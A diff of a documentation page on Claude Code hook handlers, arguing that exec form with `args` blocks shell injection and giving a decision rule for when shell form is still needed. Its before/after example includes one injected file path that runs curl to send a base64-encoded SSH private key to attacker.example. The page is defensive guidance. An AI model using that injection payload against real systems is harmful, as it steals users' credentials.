@@ -18,18 +18,18 @@ maturity: established
 
 > A hook's `args` spawns the command with `execve`, not a shell, so substituted input cannot inject shell syntax. Reserve shell form for pipes and expansion.
 
-## The Two Forms
+## The two forms
 
 A Claude Code [`command`-type hook handler](https://code.claude.com/docs/en/hooks) executes in one of two forms, selected by the presence or absence of `args`:
 
 | Form | Selected when | How the harness invokes it |
 |------|--------------|------------------------|
-| **Shell form** | `args` absent | Passes `command` to `sh -c` on macOS/Linux, Git Bash on Windows, or PowerShell. Shell tokenises, expands variables, and interprets pipes, `&&`, redirects, and globs. |
-| **Exec form** | `args` present | Resolves `command` on `PATH` and spawns it directly. Each `args` element becomes one argument verbatim. Special characters pass through because there is no shell to interpret them. |
+| Shell form | `args` absent | Passes `command` to `sh -c` on macOS/Linux, Git Bash on Windows, or PowerShell. Shell tokenises, expands variables, and interprets pipes, `&&`, redirects, and globs. |
+| Exec form | `args` present | Resolves `command` on `PATH` and spawns it directly. Each `args` element becomes one argument verbatim. Special characters pass through because there is no shell to interpret them. |
 
-The [Claude Code changelog](https://code.claude.com/docs/en/changelog) for v2.1.139 (2026-05-11) frames the benefit as quoting convenience. The deeper consequence is that exec form neutralises shell metacharacters as an attack surface.
+The [Claude Code changelog](https://code.claude.com/docs/en/changelog) for v2.1.139 (2026-05-11) frames the benefit as quoting convenience. The larger consequence is that exec form neutralizes shell metacharacters as an attack surface.
 
-## The Failure Mode Exec Form Closes
+## The failure mode exec form closes
 
 Hook handlers commonly substitute JSON payload fields — `${tool_input.file_path}`, `${tool_input.command}`, `${tool_response.output}` — into `command`. The [PostToolUse auto-formatting page](../tools/claude/posttooluse-auto-formatting.md) shows the canonical pattern:
 
@@ -54,7 +54,7 @@ The exec-form rewrite removes the failure mode at the syntax layer:
 
 The harness substitutes `${tool_input.file_path}` as a plain string into one `argv` slot. `execve` does not parse shell metacharacters — `;`, `|`, `$()`, and backticks land as literal argument values. Per the [OWASP OS Command Injection Defense Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.md), when command and arguments pass as separate array elements, chaining and redirection operators arrive as parameters, not syntax.
 
-## The Cross-Domain Pattern
+## The cross-domain pattern
 
 The exec/shell split is the same pattern in [Dockerfile `CMD`](https://www.docker.com/blog/docker-best-practices-choosing-between-run-cmd-and-entrypoint/), Kubernetes pod `command:`/`args:`, and the difference between Java's `Runtime.exec(String)` and `ProcessBuilder`. The safe form is always the one that bypasses shell parsing.
 
@@ -68,23 +68,23 @@ graph TD
     F --> G[Injection if input untrusted]
 ```
 
-## When Shell Form Is Still Right
+## When shell form is still right
 
 Exec form does not deprecate shell form. Three conditions justify keeping the shell:
 
-- **Pipes and redirects.** `jq -r '.tool_input.file_path' | xargs npx prettier --write` needs `|`.
-- **Variable expansion or globs.** `find src/ -name "*.ts" -newer "$LAST_RUN"` needs glob expansion and `$LAST_RUN`; exec form would pass `*.ts` literally.
-- **Windows `.cmd` and `.bat` shims.** The [hooks reference](https://code.claude.com/docs/en/hooks) notes exec form on Windows requires a real `.exe`; the `npm`, `npx`, and `eslint` shims in `node_modules/.bin` are not. Invoke the underlying script with `node` — `"command": "node", "args": ["${CLAUDE_PLUGIN_ROOT}/node_modules/eslint/bin/eslint.js"]` — rather than fall back to shell form.
+- Pipes and redirects. `jq -r '.tool_input.file_path' | xargs npx prettier --write` needs `|`.
+- Variable expansion or globs. `find src/ -name "*.ts" -newer "$LAST_RUN"` needs glob expansion and `$LAST_RUN`; exec form would pass `*.ts` literally.
+- Windows `.cmd` and `.bat` shims. The [hooks reference](https://code.claude.com/docs/en/hooks) notes exec form on Windows requires a real `.exe`; the `npm`, `npx`, and `eslint` shims in `node_modules/.bin` are not. Invoke the underlying script with `node` — `"command": "node", "args": ["${CLAUDE_PLUGIN_ROOT}/node_modules/eslint/bin/eslint.js"]` — rather than fall back to shell form.
 
 For the first two, wrap the shell logic in a `scripts/` file and call it in exec form: `"command": "scripts/format-changed.sh", "args": ["${tool_input.file_path}"]`. The script receives attacker-influenceable input as a positional argument — a string, not a syntax fragment.
 
-## Decision Rule
+## Decision rule
 
 For any hook that substitutes hook input into a command:
 
-1. **Default to exec form.** Move every substituted value into `args`. The harness substitutes `${path}` placeholders into both `command` and each `args` element ([hooks reference](https://code.claude.com/docs/en/hooks)).
-2. **Switch to shell form only for shell features** exec form cannot express, and only when no substituted field is attacker-influenceable.
-3. **Wrap unavoidable shell features in a script** invoked in exec form, passing hook fields as positional arguments.
+1. Default to exec form. Move every substituted value into `args`. The harness substitutes `${path}` placeholders into both `command` and each `args` element ([hooks reference](https://code.claude.com/docs/en/hooks)).
+2. Switch to shell form only for shell features exec form cannot express, and only when no substituted field is attacker-influenceable.
+3. Wrap unavoidable shell features in a script invoked in exec form, passing hook fields as positional arguments.
 
 The rule maps onto the [lethal trifecta threat model](../security/lethal-trifecta-threat-model.md): a hook running `Bash`-class code on substituted tool input is the egress leg. Closing the syntactic injection vector does not remove the principal's authority — it removes one mechanism by which untrusted content escalates that authority into arbitrary command execution.
 
@@ -92,7 +92,7 @@ The rule maps onto the [lethal trifecta threat model](../security/lethal-trifect
 
 A `PostToolUse` hook that runs Prettier on every edited file.
 
-**Before — shell form, substituted path can break out:**
+Before — shell form, where a substituted path can break out:
 
 ```json
 {
@@ -114,7 +114,7 @@ A `PostToolUse` hook that runs Prettier on every edited file.
 
 A `file_path` of `a.js"; curl attacker.example/$(cat ~/.ssh/id_rsa | base64); echo "` parses as three shell statements.
 
-**After — exec form, metacharacters land in the argv slot:**
+After — exec form, where metacharacters land in the argv slot:
 
 ```json
 {
